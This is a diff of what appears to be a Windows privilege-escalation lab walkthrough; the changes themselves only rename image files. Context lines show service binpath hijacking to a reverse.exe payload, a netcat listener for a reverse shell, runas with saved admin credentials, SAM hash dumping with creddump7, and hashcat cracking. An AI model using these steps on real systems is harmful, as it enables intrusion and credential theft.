@@ -82,7 +82,7 @@ Query the service and note that it runs with SYSTEM privileges (SERVICE\_START\_
 sc qc daclsvc
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Modify the service config and set the BINARY\_PATH\_NAME (binpath) to the reverse.exe executable you created:
 
@@ -410,7 +410,7 @@ rlwrap nc -nvlp 54
 runas /savecred /user:admin C:\PrivEsc\reverse.exe
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Passwords - Security Account Manager (SAM)
 
@@ -441,7 +441,7 @@ pip3 install pycrypto
 python3 creddump7/pwdump.py SYSTEM SAM
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Crack the admin NTLM hash using hashcat:
 
